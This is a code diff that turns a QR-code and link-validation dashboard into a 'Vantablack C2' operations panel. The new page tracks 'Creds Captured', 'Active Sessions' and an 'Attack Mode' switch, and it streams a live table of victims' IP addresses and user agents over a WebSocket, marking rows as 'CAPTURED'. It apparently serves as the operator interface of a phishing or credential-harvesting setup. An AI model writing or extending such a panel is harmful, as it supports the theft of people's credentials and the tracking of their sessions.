@@ -1,315 +1,229 @@
-{% extends "base.html" %}
-
-{% block content %}
-<div class="space-y-6">
-    <!-- Header -->
-    <div class="text-center">
-        <h1 class="text-3xl font-bold text-accent mb-2">
-            <i class="fas fa-tachometer-alt mr-2"></i>
-            Dashboard Vantablack Core
-        </h1>
-        <p class="text-gray-400">Interface de contrôle principal - Monitoring en temps réel</p>
-    </div>
-
-    <!-- Stats Grid -->
-    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-        <!-- QR Metrics -->
-        <div class="dashboard-card">
-            <div class="flex items-center">
-                <div class="p-3 bg-blue-900 rounded-lg">
-                    <i class="fas fa-qrcode text-2xl text-blue-300"></i>
-                </div>
-                <div class="ml-4">
-                    <h3 class="text-lg font-semibold">QR Codes</h3>
-                    <p class="text-2xl font-bold" id="qr-count">0</p>
-                    <p class="text-sm text-gray-400">Générés</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- Link Validation -->
-        <div class="dashboard-card">
-            <div class="flex items-center">
-                <div class="p-3 bg-green-900 rounded-lg">
-                    <i class="fas fa-link text-2xl text-green-300"></i>
-                </div>
-                <div class="ml-4">
-                    <h3 class="text-lg font-semibold">Liens Validés</h3>
-                    <p class="text-2xl font-bold" id="link-validation-count">0</p>
-                    <p class="text-sm text-gray-400">Succès</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- System Health -->
-        <div class="dashboard-card">
-            <div class="flex items-center">
-                <div class="p-3 bg-purple-900 rounded-lg">
-                    <i class="fas fa-heartbeat text-2xl text-purple-300"></i>
-                </div>
-                <div class="ml-4">
-                    <h3 class="text-lg font-semibold">Santé Système</h3>
-                    <p class="text-2xl font-bold text-green-400" id="system-health">100%</p>
-                    <p class="text-sm text-gray-400">Uptime</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- Performance -->
-        <div class="dashboard-card">
-            <div class="flex items-center">
-                <div class="p-3 bg-yellow-900 rounded-lg">
-                    <i class="fas fa-bolt text-2xl text-yellow-300"></i>
-                </div>
-                <div class="ml-4">
-                    <h3 class="text-lg font-semibold">Performance</h3>
-                    <p class="text-2xl font-bold" id="response-time">0ms</p>
-                    <p class="text-sm text-gray-400">Moyenne</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Main Content Grid -->
-    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-        <!-- Quick Actions -->
-        <div class="dashboard-card">
-            <h2 class="text-xl font-semibold mb-4">
-                <i class="fas fa-bolt mr-2"></i>Actions Rapides
-            </h2>
-            
-            <div class="space-y-3">
-                <button onclick="generateQuickQR()" class="btn btn-primary w-full text-left">
-                    <i class="fas fa-qrcode mr-2"></i>
-                    Générer QR Rapide
-                </button>
-                
-                <button onclick="validateQuickLink()" class="btn btn-secondary w-full text-left">
-                    <i class="fas fa-check-circle mr-2"></i>
-                    Valider Lien
-                </button>
-                
-                <button onclick="showSystemStatus()" class="btn btn-secondary w-full text-left">
-                    <i class="fas fa-chart-bar mr-2"></i>
-                    Statut Complet
-                </button>
-                
-                <button onclick="openTerminal()" class="btn btn-secondary w-full text-left">
-                    <i class="fas fa-terminal mr-2"></i>
-                    Terminal
-                </button>
-            </div>
-        </div>
-
-        <!-- System Status -->
-        <div class="dashboard-card">
-            <h2 class="text-xl font-semibold mb-4">
-                <i class="fas fa-server mr-2"></i>Statut Système
-            </h2>
-            
-            <div class="space-y-3">
-                <div class="flex justify-between items-center">
-                    <span class="text-gray-300">API Core</span>
-                    <span class="status-badge status-operational" id="api-status">
-                        <i class="fas fa-circle mr-1"></i>Operational
-                    </span>
-                </div>
-                
-                <div class="flex justify-between items-center">
-                    <span class="text-gray-300">Base de données</span>
-                    <span class="status-badge status-operational" id="db-status">
-                        <i class="fas fa-circle mr-1"></i>Connected
-                    </span>
-                </div>
-                
-                <div class="flex justify-between items-center">
-                    <span class="text-gray-300">Réseau</span>
-                    <span class="status-badge status-operational" id="network-status">
-                        <i class="fas fa-circle mr-1"></i>Online
-                    </span>
-                </div>
-                
-                <div class="flex justify-between items-center">
-                    <span class="text-gray-300">Métriques</span>
-                    <span class="status-badge status-operational" id="metrics-status">
-                        <i class="fas fa-circle mr-1"></i>Active
-                    </span>
-                </div>
-            </div>
-            
-            <div class="mt-4 pt-4 border-t border-gray-700">
-                <div class="flex justify-between text-sm">
-                    <span class="text-gray-400">Uptime:</span>
-                    <span class="text-gray-300" id="system-uptime">00:00:00</span>
-                </div>
-                <div class="flex justify-between text-sm">
-                    <span class="text-gray-400">Mémoire:</span>
-                    <span class="text-gray-300" id="system-memory">0MB/0MB</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Recent Activity -->
-    <div class="dashboard-card">
-        <h2 class="text-xl font-semibold mb-4">
-            <i class="fas fa-history mr-2"></i>Activité Récente
-        </h2>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vantablack C2 | Operations</title>
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --text-color: #00ff00;
+            --accent-color: #ff0000;
+            --panel-bg: #111;
+            --border-color: #333;
+        }
         
-        <div class="overflow-x-auto">
-            <table class="table">
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 20px;
+            overflow: hidden;
+        }
+        
+        h1, h2, h3 {
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+        }
+        
+        .container {
+            display: grid;
+            grid-template-columns: 1fr 3fr;
+            grid-gap: 20px;
+            height: 90vh;
+        }
+        
+        .panel {
+            background-color: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            overflow-y: auto;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+        }
+        
+        .stat-card {
+            background: #000;
+            border: 1px solid var(--text-color);
+            padding: 10px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 2em;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            font-size: 0.8em;
+            opacity: 0.8;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        
+        th, td {
+            text-align: left;
+            padding: 8px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        th {
+            color: var(--accent-color);
+        }
+        
+        .status-active {
+            color: var(--text-color);
+        }
+        
+        .status-captured {
+            color: var(--accent-color);
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .log-entry {
+            font-size: 0.9em;
+            margin-bottom: 5px;
+            border-left: 2px solid var(--text-color);
+            padding-left: 10px;
+        }
+        
+        .log-time {
+            color: #888;
+        }
+        
+    </style>
+</head>
+<body>
+
+    <h1>VANTABLACK <span style="color:var(--accent-color)">C2</span> // OPERATIONS</h1>
+    
+    <div class="container">
+        <!-- Sidebar: Stats & Controls -->
+        <div class="panel">
+            <h2>System Status</h2>
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="active-sessions">0</div>
+                    <div class="stat-label">Active Sessions</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="captured-creds">0</div>
+                    <div class="stat-label">Creds Captured</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="uptime">0s</div>
+                    <div class="stat-label">Uptime</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" style="color:red">OFF</div>
+                    <div class="stat-label">Attack Mode</div>
+                </div>
+            </div>
+            
+            <h3>Activity Log</h3>
+            <div id="activity-log" style="height: 300px; overflow-y: auto;">
+                <div class="log-entry"><span class="log-time">[SYSTEM]</span> Dashboard initialized...</div>
+            </div>
+        </div>
+        
+        <!-- Main: Sessions Table -->
+        <div class="panel">
+            <h2>Live Sessions</h2>
+            <table id="sessions-table">
                 <thead>
                     <tr>
-                        <th>Time</th>
-                        <th>Action</th>
-                        <th>Type</th>
+                        <th>ID</th>
+                        <th>IP Address</th>
+                        <th>User Agent</th>
                         <th>Status</th>
-                        <th>Details</th>
+                        <th>Created</th>
                     </tr>
                 </thead>
-                <tbody id="recent-activity">
-                    <tr>
-                        <td class="text-gray-400">--:--:--</td>
-                        <td class="text-gray-400">No activity yet</td>
-                        <td class="text-gray-400">--</td>
-                        <td class="text-gray-400">--</td>
-                        <td class="text-gray-400">--</td>
-                    </tr>
+                <tbody>
+                    <!-- Rows will be injected here -->
                 </tbody>
             </table>
         </div>
     </div>
 
-    <!-- QR Preview Section -->
-    <div class="dashboard-card">
-        <h2 class="text-xl font-semibold mb-4">
-            <i class="fas fa-eye mr-2"></i>Aperçu QR
-        </h2>
-        
-        <div class="text-center">
-            <div class="qr-preview mx-auto mb-4" id="qr-preview">
-                <div class="text-gray-500 py-8">
-                    <i class="fas fa-qrcode text-4xl mb-2"></i>
-                    <p>Aucun QR code généré</p>
-                </div>
-            </div>
+    <script>
+        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${wsProtocol}//${window.location.host}/v5/dashboard/ws`;
+        let socket;
+
+        function connect() {
+            socket = new WebSocket(wsUrl);
             
-            <div class="flex space-x-4 justify-center">
-                <button onclick="generateTestQR()" class="btn btn-primary">
-                    <i class="fas fa-plus mr-2"></i>Générer Test
-                </button>
-                <button onclick="downloadQR()" class="btn btn-secondary" disabled id="download-btn">
-                    <i class="fas fa-download mr-2"></i>Télécharger
-                </button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-// Dashboard-specific JavaScript
-function generateQuickQR() {
-    showToast('Génération QR rapide...', 'info');
-    // Implementation would go here
-}
-
-function validateQuickLink() {
-    showToast('Validation de lien...', 'info');
-    // Implementation would go here
-}
-
-function showSystemStatus() {
-    // Navigate to status page
-    window.location.href = '/ui/status';
-}
-
-function openTerminal() {
-    showToast('Ouverture du terminal...', 'info');
-    // Implementation would go here
-}
-
-function generateTestQR() {
-    showToast('Génération QR test...', 'info');
-    // Simulate QR generation
-    setTimeout(() => {
-        document.getElementById('qr-preview').innerHTML = 
-            '<img src="/static/images/sample-qr.png" alt="Test QR" class="w-full h-auto">';
-        document.getElementById('download-btn').disabled = false;
-        showToast('QR test généré!', 'success');
-        
-        // Update activity
-        addActivity('QR Test', 'success', 'Generated test QR code');
-    }, 1000);
-}
-
-function downloadQR() {
-    showToast('Téléchargement QR...', 'info');
-    // Implementation would go here
-}
-
-function addActivity(action, status, details) {
-    const activityTable = document.getElementById('recent-activity');
-    const now = new Date().toLocaleTimeString();
-    
-    const row = document.createElement('tr');
-    row.innerHTML = `
-        <td class="font-mono">${now}</td>
-        <td>${action}</td>
-        <td><span class="status-badge ${getStatusClass(status)}">${status}</span></td>
-        <td>${details}</td>
-    `;
-    
-    activityTable.prepend(row);
-    
-    // Keep only last 5 activities
-    if (activityTable.children.length > 5) {
-        activityTable.removeChild(activityTable.lastChild);
-    }
-}
-
-function getStatusClass(status) {
-    return status === 'success' ? 'status-operational' : 
-           status === 'warning' ? 'status-warning' : 'status-error';
-}
-
-// Initialize dashboard metrics
-async function initDashboard() {
-    try {
-        const response = await fetch('/v5/metrics');
-        if (response.ok) {
-            const metrics = await response.text();
-            updateDashboardMetrics(metrics);
+            socket.onopen = function() {
+                log("Connected to C2 Server.");
+            };
+            
+            socket.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                if (data.type === 'update') {
+                    updateDashboard(data);
+                }
+            };
+            
+            socket.onclose = function() {
+                log("Disconnected. Retrying...");
+                setTimeout(connect, 2000);
+            };
         }
-    } catch (error) {
-        console.error('Failed to load metrics:', error);
-    }
-    
-    // Start periodic updates
-    setInterval(updateDashboardMetrics, 5000);
-}
 
-function updateDashboardMetrics(metricsText) {
-    // Parse metrics and update dashboard
-    // This would parse Prometheus format metrics
-    
-    // Simulate metrics for demo
-    document.getElementById('qr-count').textContent = Math.floor(Math.random() * 100);
-    document.getElementById('link-validation-count').textContent = Math.floor(Math.random() * 50);
-    document.getElementById('response-time').textContent = Math.floor(Math.random() * 100) + 'ms';
-    
-    // Update uptime
-    const uptimeElement = document.getElementById('system-uptime');
-    if (uptimeElement) {
-        const hours = Math.floor(Math.random() * 24);
-        const minutes = Math.floor(Math.random() * 60);
-        const seconds = Math.floor(Math.random() * 60);
-        uptimeElement.textContent = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-    }
-}
+        function updateDashboard(data) {
+            // Update Stats
+            document.getElementById('active-sessions').innerText = data.stats.active_sessions;
+            document.getElementById('captured-creds').innerText = data.stats.captured_creds;
+            document.getElementById('uptime').innerText = data.stats.uptime;
+            
+            // Update Sessions Table
+            const tbody = document.querySelector('#sessions-table tbody');
+            tbody.innerHTML = '';
+            
+            data.sessions.forEach(session => {
+                const tr = document.createElement('tr');
+                const statusClass = session.captured ? 'status-captured' : 'status-active';
+                const statusText = session.captured ? 'CAPTURED' : session.status;
+                
+                tr.innerHTML = `
+                    <td>${session.id.substring(0, 8)}...</td>
+                    <td>${session.ip}</td>
+                    <td title="${session.ua}">${session.ua.substring(0, 30)}...</td>
+                    <td class="${statusClass}">${statusText}</td>
+                    <td>${new Date(session.created_at * 1000).toLocaleTimeString()}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+        
+        function log(msg) {
+            const logDiv = document.getElementById('activity-log');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="log-time">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            logDiv.prepend(entry);
+        }
 
-// Initialize when page loads
-document.addEventListener('DOMContentLoaded', () => {
-    initDashboard();
-});
-</script>
-{% endblock %}
+        connect();
+    </script>
+</body>
+</html>
